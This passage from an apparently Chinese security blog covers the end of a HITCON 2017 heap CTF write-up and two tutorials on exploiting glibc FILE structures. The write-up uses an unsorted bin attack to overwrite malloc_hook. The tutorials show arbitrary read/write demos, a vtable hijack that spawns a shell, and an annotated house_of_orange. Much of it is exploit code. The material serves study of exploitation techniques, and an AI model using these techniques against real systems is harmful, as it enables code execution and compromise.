<p><code>0x5555557571b0</code> 就是 hole.<br>此时 <code>heap_2</code> 的 <code>pre_size</code>  与 <code>pre_inuse</code>没变化。</p>
<p>在清理下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">new_heap(&quot;s&quot;)</div><div class="line">del_heap(0)</div><div class="line">del_heap(1)</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513065626592mlsrd8by.png?imageslim" alt="paste image"></p>
<p>这里那两个 <code>unsorted bin</code> 不合并的原因是，系统判定下面那个 <code>unsorted bin</code> ，找到 hole 里面的 第二个 8字节，取它的最低位，为0表示已经释放，为1则未被释放。由于那里值 为 <code>0x3091</code> (不知道从哪来的）,所以系统会认为它还没有被释放。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15130658619712j52ggc3.png?imageslim" alt="paste image"></p>
<p>此时 <code>heap_2</code> 的 <code>pre_size</code> 为 <code>0x110</code>,  <code>pre_inuse</code> 为 <code>0</code>。如果我们释放掉 <code>heap2</code> ,系统根据  <code>pre_size</code> 找到 偏移 <code>0xb0</code> ，并且会认为 这个块已经释放（ <code>pre_inuse</code> 为 <code>0</code>）， 然后就会与 <code>heap2</code> 合并，这样就会有 <code>unsorted bin</code> 的交叉情况了。</p>
<p>要能成功 <code>free heap_2</code> 还需要 偏移 <code>0xb0</code> 处伪造一个 <code>free chunk</code> 来过掉 <code>unlink check</code>.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># fake free chunk</div><div class="line">add_ghost(12345, p64(heap + 0xb0)*2)</div><div class="line">new_heap(p64(0)*8 + p64(0) + p64(0x111) + p64(heap) + p64(heap)) # 0</div><div class="line">new_heap(&quot;s&quot;)  #防止和 top chunk 合并</div><div class="line"></div><div class="line">del_heap(2)</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513066961579hq1ooo7i.png?imageslim" alt="paste image"></p>
<p>首先分配 <code>ghost</code> ,它的 <code>fd</code> 和 <code>bk</code> 域都是 <code>偏移 0xb0</code> , 然后在 分配 <code>heap</code> ,在 伪造<code>偏移 0xb0</code> <code>free chunk</code> , 使他的 <code>fd</code> 和 <code>bk</code> 都指向 <code>ghost</code> 所在块的基地址。<br>这样就能过掉 <code>unlink</code> 的 检查<br>然后  <code>del_heap(2)</code>, 获得一个 <code>0x1c0</code> 的 <code>unsorted bin</code> , 可以看到此时已经有 <code>free chunk</code> 的交叉情况了。</p>
<p>下一步，在交叉区域内构造 <code>unsorted bin</code>, 然后 分配内存，修改其中的 <code>bk</code> 进行 <code>unsorted bin</code>攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">del_heap(0)</div><div class="line">new_heap(&quot;s&quot;)  # 0</div><div class="line">new_heap(&quot;s&quot;)  # 2</div><div class="line"></div><div class="line">del_heap(0)</div><div class="line">del_heap(2)</div></pre></td></tr></table></figure>
<p>首先释放掉 <code>heap0</code> 增加两个<code>heap</code>. ,会出现交叉的。原因有两个 <code>unsorted bin</code>.</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513070134752abydywfr.png?imageslim" alt="paste image"></p>
<p>然后分别释放 <code>heap 0</code>, <code>heap 2</code>,注意在释放 <code>heap 0</code> 的时候，由于画红圈标注的那个 <code>smallbin</code> 中的 <code>pre_inuse</code> 为 1， 所以 它上面的那个 <code>smallbin</code>  没有和 <code>unsorted bin</code> 合并， 原因在于，上一步 <code>new_heap(&quot;s&quot;)  # 2</code> 时 ， 切割完后，剩下 <code>chunk</code> 开头正好是 画红圈标注的那个 <code>smallbin</code>, 就会设置 它的 <code>pre_inuse</code> 为 1。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513070709047o8ozvocv.png?imageslim" alt="paste image"></p>
<p>最后我们有了两个 <code>unsorted bin</code>.再次分配 <code>heap</code> 时，会先分配到位于 <code>0x60</code>,大小为 <code>0xb0</code> 的 <code>unsorted bin</code>,此时我们就可以修改 位于 <code>0xb0</code> 大小为 <code>0x1c0</code> 的  <code>unsorted bin</code>的首部，进而 进行  <code>unsorted bin</code> 攻击。</p>
<p><strong>unsorted bin attack</strong></p>
<p>现在我们已经有了 <code>unsorted bin</code> 攻击的能力了，目前我知道的攻击方式如下。</p>
<ul>
<li>修改 <code>global_max_fast</code> ，之后使用 <code>fastbin</code> 攻击, 条件不满足 （x）</li>
<li>house_of_orange , 新版 libc 校验 (x)</li>
<li>修改 <code>stdin-&gt;_IO_base_end</code>, 修改 <code>malloc_hook</code>. ( ok )</li>
</ul>
<p>在调用 <code>scanf</code> 获取输入时，首先会把输入的东西复制到 <code>[_IO_base_base, _IO_base_end]</code>, 最大大小为 <code>_IO_base_end - _IO_base_base</code>。<br>修改  <code>unsorted bin</code>  的 <code>bck</code> 为 <code>_IO_base_end-0x10</code> ,就可以使 <code>_IO_base_end=main_arens+0x88</code>,我们就能修改很多东西了，而且 <code>malloc_hook</code> 就在这里面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># 修改 unsorted bin </div><div class="line">new_heap(p64(0)*8 + p64(0) + p64(0xb1) + p64(0) + p64(buf_end-0x10))</div><div class="line"># 触发unsorted bin attack, 然后输入内容，修改 malloc_hook 为 magic</div><div class="line">new_heap((&quot;\x00&quot;*5 + p64(lock) + p64(0)*9 + p64(vtable)).ljust(0x1ad,&quot;\x00&quot;)+ p64(magic))</div></pre></td></tr></table></figure>
<p>注意 <code>unsorted bin</code> 的 <code>size</code> 域 一定要修改为 <code>0xb1</code>, 原因是 分配内存时如果 <code>smallbin</code>, <code>fastbin</code>都不能分配，就会遍历 <code>unsorted bin</code> ,如果找到大小完全匹配的就直接返回，停止遍历，否则会持续性遍历，此时的 <code>bck</code> 已经被修改为 <code>_IO_base_end-0x10</code>, 如果遍历到这个, 会 <code>check</code> ,具体原因可以自行调试看。</p>
<p>我们接下来需要分配<code>heap</code> 大小 为 <code>0xb0</code>, 设置<code>size</code> 域为 <code>0xb1</code>，  会在 <code>unsorted bin</code> 第一次遍历后直接返回。不会报错。此时<code>unsorted bin</code>完成。</p>
<p><code>magic</code> 可用 <code>one_gadget</code> 查找。<br>最后 <code>del_heap(2)</code> 触发 <code>malloc</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># 此时 unsorted bin 已经损坏， del heap 2触发</div><div class="line"># 堆 unsorted bin的操作</div><div class="line"># 触发 malloc_printerr </div><div class="line"># malloc_printerr 里面会调用 malloc </div><div class="line">del_heap(2)</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15130721693589g8lyo0h.png?imageslim" alt="paste image"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这道题非常不错，不仅学到了利用 <code>file</code> 结构体的新型攻击方式，还可以通过这道题深入理解堆分配的流程。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://brieflyx.me/2016/heap/glibc-heap/" target="_blank" rel="external">http://brieflyx.me/2016/heap/glibc-heap/</a></p>
<p><a href="https://github.com/scwuaptx/CTF/tree/master/2017-writeup/hitcon/ghost_in_the_heap" target="_blank" rel="external">https://github.com/scwuaptx/CTF/tree/master/2017-writeup/hitcon/ghost_in_the_heap</a></p>
<p><a href="https://tradahacking.vn/hitcon-2017-ghost-in-the-heap-writeup-ee6384cd0b7" target="_blank" rel="external">https://tradahacking.vn/hitcon-2017-ghost-in-the-heap-writeup-ee6384cd0b7</a></p>
]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> file struct </tag>
            
            <tag> off-by-null </tag>
            
            <tag> heap learning </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pwn with File结构体（二）]]></title>
      <url>/2017/12/07/pwn_with_file_part2.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274</a></p>
<hr>
<p>最新版的 <code>libc</code> 中会对 <code>vtable</code> 检查，所以之前的攻击方式，告一段落。下面介绍一种，通过修改 <code>_IO_FILE</code> 实现任意地址读和任意地址写的方式。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><code>_IO_FILE</code> 通过这些指针，来读写数据。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512654157088d9edyn3q.png?imageslim" alt="paste image"><br>如果我们修改了它们，然后通过一些文件读写函数时，我们就能实现 任意地址读写。</p>
<p> <strong>任意地址读</strong></p>
<p> <img src="http://oy9h5q2k4.bkt.clouddn.com/1512656021050j3vjc54v.png?imageslim" alt="paste image"></p>
<p> 代码示例<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"> #include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;   </div><div class="line">    FILE *fp; </div><div class="line">    char *msg = &quot;hello_file&quot;;</div><div class="line"></div><div class="line">    char *buf = malloc(100);</div><div class="line">    read(0, buf, 100);</div><div class="line">    fp = fopen(&quot;key.txt&quot;, &quot;rw&quot;);</div><div class="line"></div><div class="line">    // 设置 flag 绕过 check</div><div class="line">    fp-&gt;_flags &amp;= ~8;</div><div class="line">    fp-&gt;_flags |= 0x800;</div><div class="line"></div><div class="line">    // _IO_write_base write数据的起始地址， _IO_write_ptr  write数据的终止地址</div><div class="line">    fp-&gt;_IO_write_base = msg;</div><div class="line">    fp-&gt;_IO_write_ptr = msg + 6;</div><div class="line"></div><div class="line">    //绕过检查</div><div class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_base;</div><div class="line"></div><div class="line">    // write 的目的 文件描述符， 1 --&gt; 标准输出</div><div class="line">    fp-&gt;_fileno = 1;</div><div class="line">    fwrite(buf, 1, 100, fp);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p> <img src="http://oy9h5q2k4.bkt.clouddn.com/1512656917401bhu6ayhp.png?imageslim" alt="paste image"></p>
<p>  <strong>任意地址写</strong></p>
<p>  <img src="http://oy9h5q2k4.bkt.clouddn.com/15126569407780y6n1s1m.png?imageslim" alt="paste image"></p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">  #include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;   </div><div class="line">    FILE *fp; </div><div class="line">    char msg[100];</div><div class="line"></div><div class="line">    char *buf = malloc(100);</div><div class="line">    fp = fopen(&quot;key.txt&quot;, &quot;rw&quot;);</div><div class="line"></div><div class="line">    // 设置 flag 绕过 check</div><div class="line">    fp-&gt;_flags &amp;= ~4;</div><div class="line"></div><div class="line">    // _IO_buf_base buffer 的起始地址， _IO_buf_end  buffer 的终止地址</div><div class="line">    // fread 先把数据读入 [_IO_buf_base, _IO_buf_end] 形成的 buffer</div><div class="line">    // 然后复制到目的 buffer</div><div class="line">    fp-&gt;_IO_buf_base = msg;</div><div class="line">    fp-&gt;_IO_buf_end = msg + 100;</div><div class="line"></div><div class="line">    // 设置 文件描述符， 0---&gt; stdin, 从标准输入读数据</div><div class="line">    fp-&gt;_fileno = 0;</div><div class="line">    fread(buf, 1, 6, fp);</div><div class="line">    </div><div class="line">    puts(msg);</div><div class="line">    puts(buf);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>  <img src="http://oy9h5q2k4.bkt.clouddn.com/1512657551566q5ox73ro.png?imageslim" alt="paste image"></p>
<p> <strong>利用 stdin / stdout 任意地址写/ 读</strong></p>
<p><code>puts</code>, <code>scanf</code> 等一批系统函数默认使用的 <code>stdin</code> , <code>stdout</code> ,<code>stderr</code> 等结构体进行操作，通过修改这些结构体的内容，可以更方便的实现任意地址读，任意地址写。</p>
<p> <code>stdin</code> 也是 <code>_IO_FILE</code> 结构体<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"> #include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line"></div><div class="line">int global_val = 0xaabbccdd;</div><div class="line"></div><div class="line"></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;   </div><div class="line">    FILE *fp; </div><div class="line">    int var;</div><div class="line"></div><div class="line">    fp = stdin;</div><div class="line"></div><div class="line">    fp-&gt;_flags &amp;= ~4;</div><div class="line"></div><div class="line">    fp-&gt;_IO_buf_base = stdout;</div><div class="line">    fp-&gt;_IO_buf_end = stdout + 100;</div><div class="line"></div><div class="line"></div><div class="line">    scanf(&quot;%d&quot;,&amp;var);</div><div class="line">    </div><div class="line">    printf(&quot;0x%x\n&quot;, global_val);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p> 运行之<br> <img src="http://oy9h5q2k4.bkt.clouddn.com/1512658393494amnz5255.png?imageslim" alt="paste image"></p>
<p> 成功修改 <code>stdout</code> 结构体</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"> #include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;   </div><div class="line">    FILE *fp; </div><div class="line">    char *msg = &quot;hello_stdout&quot;;</div><div class="line"></div><div class="line">    char *buf = malloc(100);</div><div class="line"></div><div class="line">    fp = stdout;</div><div class="line"></div><div class="line">    // 设置 flag 绕过 check</div><div class="line">    fp-&gt;_flags &amp;= ~8;</div><div class="line">    fp-&gt;_flags |= 0x800;</div><div class="line"></div><div class="line">    // _IO_write_base write数据的起始地址， _IO_write_ptr  write数据的终止地址</div><div class="line">    fp-&gt;_IO_write_base = msg;</div><div class="line">    fp-&gt;_IO_write_ptr = msg + 12;</div><div class="line"></div><div class="line">    //绕过检查</div><div class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_base;</div><div class="line"></div><div class="line">    // write 的目的 文件描述符， 1 --&gt; 标准输出</div><div class="line">    fp-&gt;_fileno = 1;</div><div class="line">    puts(&quot;&lt;-----&gt;this is append on msg &quot;);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p> <img src="http://oy9h5q2k4.bkt.clouddn.com/15126587803351zrlnl5p.png?imageslim" alt="paste image"></p>
<p> 成功读到了， <code>msg</code> 的内容。</p>
<p> 参考：</p>
<p> <a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique" target="_blank" rel="external">https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique</a></p>
]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> file struct </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pwn with File结构体（一）]]></title>
      <url>/2017/12/07/pwn_with_file_part1.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274</a></p>
<hr>
<p>利用 <code>FILE</code> 结构体进行攻击，在现在的 <code>ctf</code> 比赛中也经常出现，最近的 <code>hitcon2017</code> 又提出了一种新的方式。本文对该攻击进行总结。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先来一张 <code>_IO_FILE</code> 结构体的结构</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512636924331hh06dby3.png?imageslim" alt="paste image"></p>
<p><code>_IO_FILE_plus</code> 等价于 <code>_IO_FILE</code> + <code>vtable</code> </p>
<p>调试着来看看(64 位)</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/151263718616115jrxm3q.png?imageslim" alt="paste image"></p>
<p><code>vtable</code> 指向的位置是一组函数指针<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15126373161775c8fyo38.png?imageslim" alt="paste image"><br><strong>利用 <code>vtable</code> 进行攻击</strong></p>
<p>通过一个 <code>uaf</code> 的示例代码来演示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">void pwn(void)</div><div class="line">&#123;</div><div class="line">    system(&quot;sh&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">// 用于伪造 vtable</div><div class="line">void * funcs[] = &#123;</div><div class="line">    NULL, // &quot;extra word&quot;</div><div class="line">    NULL, // DUMMY</div><div class="line">    exit, // finish</div><div class="line">    NULL, // overflow</div><div class="line">    NULL, // underflow</div><div class="line">    NULL, // uflow</div><div class="line">    NULL, // pbackfail</div><div class="line">    NULL, // xsputn</div><div class="line">    NULL, // xsgetn</div><div class="line">    NULL, // seekoff</div><div class="line">    NULL, // seekpos</div><div class="line">    NULL, // setbuf</div><div class="line">    NULL, // sync</div><div class="line">    NULL, // doallocate</div><div class="line">    NULL, // read</div><div class="line">    NULL, // write</div><div class="line">    NULL, // seek</div><div class="line">    pwn,  // close</div><div class="line">    NULL, // stat</div><div class="line">    NULL, // showmanyc</div><div class="line">    NULL, // imbue</div><div class="line">&#125;;</div><div class="line"></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;   </div><div class="line">    FILE *fp;  // _IO_FILE 结构体</div><div class="line">    unsigned char *str;</div><div class="line"></div><div class="line">    printf(&quot;sizeof(FILE): 0x%x\n&quot;, sizeof(FILE));</div><div class="line"></div><div class="line">    /* _IO_FILE + vtable_ptr 分配一个 _IO_FILE_plus 结构体 */</div><div class="line">    str = malloc(sizeof(FILE) + sizeof(void *));</div><div class="line">    printf(&quot;freeing %p\n&quot;, str);</div><div class="line">    free(str);</div><div class="line"></div><div class="line">    /*打开一个文件，会分配一个 _IO_FILE_plus 结构体 ， 会使用刚刚 free 掉的内存*/</div><div class="line">    if (!(fp = fopen(&quot;/dev/null&quot;, &quot;r&quot;))) &#123;</div><div class="line">        perror(&quot;fopen&quot;);</div><div class="line">        return 1;</div><div class="line">    &#125;</div><div class="line">    printf(&quot;FILE got %p\n&quot;, fp);</div><div class="line"></div><div class="line">    /* 取得地址  */</div><div class="line">    printf(&quot;_IO_jump_t @ %p is 0x%08lx\n&quot;,</div><div class="line">           str + sizeof(FILE), *(unsigned long*)(str + sizeof(FILE)));</div><div class="line"></div><div class="line">    /* 修改 vtable 指针 */</div><div class="line">    *(unsigned long*)(str + sizeof(FILE)) = (unsigned long)funcs;</div><div class="line">    printf(&quot;_IO_jump_t @ %p now 0x%08lx\n&quot;,</div><div class="line">           str + sizeof(FILE), *(unsigned long*)(str + sizeof(FILE)));</div><div class="line"></div><div class="line">    /* 调用 fclose 触发 close */</div><div class="line">    fclose(fp);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>首先分配一个 <code>_IO_FILE_plus</code> 大小的内存块</li>
<li>然后释放掉调用 <code>fopen</code> 分配 <code>_IO_FILE_plus</code>  结构体</li>
<li>修改 <code>fp</code> 的 <code>vtable</code> 指针到我们布局的地址</li>
<li>调用 <code>fclose</code> 函数, 进而调用 <code>pwn</code></li>
</ul>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512637077462pn33x6eg.png?imageslim" alt="paste image"></p>
<p>调试可以看到，分配的大小为 <code>0xf0</code>(也就是 <code>0xe0+0x10</code>) 和<code>_IO_FILE_plus</code> 的大小是一样的</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/151263746988846mmixxo.png?imageslim" alt="paste image"></p>
<p><code>free</code> 掉后，调用 <code>fopen</code> 会占用这个内存<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1512637720387deshksip.png?imageslim" alt="paste image"></p>
<p>查看 <code>vtable</code> 也是符合预期<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15126377713979pirrqdn.png?imageslim" alt="paste image"></p>
<p>替换<code>vtable</code>指针之后<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15126378684082t5esiwh.png?imageslim" alt="paste image"></p>
<p><code>close</code> 函数已经被修改为 <code>pwn</code> 函数，最后调用 <code>fclose</code> 函数，就会调用 <code>pwn</code> 函数</p>
<p><strong>house of orange</strong></p>
<p>为了便于调试，使用 <a href="https://raw.githubusercontent.com/shellphish/how2heap/master/house_of_orange.c" target="_blank" rel="external">how2heap</a> 的代码进行调试分析。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int winner ( char *ptr);</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line"></div><div class="line"></div><div class="line">    char *p1, *p2;</div><div class="line">    size_t io_list_all, *top;</div><div class="line"></div><div class="line">    // 首先分配一个 0x400 的 chunk</div><div class="line">    p1 = malloc(0x400-16);</div><div class="line"></div><div class="line">    // 拿到 top chunk的地址</div><div class="line">    top = (size_t *) ( (char *) p1 + 0x400 - 16);</div><div class="line">    // 修改 top chunk 的 size</div><div class="line">    top[1] = 0xc01;</div><div class="line"></div><div class="line">    // 触发 syscall 的 _int_free, top_chunk 放到了 unsort bin</div><div class="line">    p2 = malloc(0x1000);</div><div class="line"></div><div class="line">    // 根据 fd 指针的偏移计算 io_list_all 的地址</div><div class="line">    io_list_all = top[2] + 0x9a8;</div><div class="line"></div><div class="line">    // 修改 top_chunk 的 bk 为  io_list_all - 0x10 ， 后面会触发</div><div class="line">    top[3] = io_list_all - 0x10;</div><div class="line"></div><div class="line">    /*</div><div class="line">     设置 fp 指针指向位置 开头 为 /bin/sh</div><div class="line">    */</div><div class="line"></div><div class="line">    memcpy( ( char *) top, &quot;/bin/sh\x00&quot;, 8);</div><div class="line"></div><div class="line">    // 修改 top chunk 的 大小 为 0x60</div><div class="line">    top[1] = 0x61;</div><div class="line"></div><div class="line">    /*</div><div class="line">      为了可以正常调用 overflow() ，需要满足一些条件</div><div class="line">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</div><div class="line">    */</div><div class="line"></div><div class="line">    _IO_FILE *fp = (_IO_FILE *) top;</div><div class="line"></div><div class="line">    fp-&gt;_mode = 0; </div><div class="line">    fp-&gt;_IO_write_base = (char *) 2;</div><div class="line">    fp-&gt;_IO_write_ptr = (char *) 3; </div><div class="line"></div><div class="line"></div><div class="line">    // 设置虚表</div><div class="line">    size_t *jump_table = &amp;top[12]; // controlled memory</div><div class="line">    jump_table[3] = (size_t) &amp;winner;</div><div class="line">    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8</div><div class="line"></div><div class="line">    // 再次 malloc, fastbin, smallbin都找不到需要的大小，会遍历 unsort bin 把它们添加到对应的 bins 中去</div><div class="line">    // 之前已经把 top-&gt;bk 设置为 io_list_all - 0x10, 所以会把 io_list_all 的值 设置为 fd, </div><div class="line">    // 也就是 main_arena+88 </div><div class="line">    // _IO_FILE_plus + 0x68 --&gt; _china , main_arena+88 + 0x68 为 smallbin[5], 块大小为 0x60 </div><div class="line">    // 所以要把 top的 size 设置为 0x60</div><div class="line">    malloc(10);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int winner(char *ptr)</div><div class="line">&#123; </div><div class="line">    system(ptr);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>代码的流程如下:</p>
<ul>
<li>首先分配 <code>0x400</code> 字节的块</li>
<li>修改 <code>top chunk</code> 的 <code>size</code> 域为 <code>0xc01</code></li>
<li><code>malloc(0x1000)</code> 触发 <code>_int_free</code> , <code>top</code> 被放到了 <code>unsorted bin</code> , 下面称它为 <code>old_top</code></li>
<li>布局 <code>old_top</code> , 设置 <code>bk = io_list_all - 0x10</code> ， 把<code>old_top</code>伪造成一个 <code>_IO_FILE_plus</code>,并设置好<code>vtable</code></li>
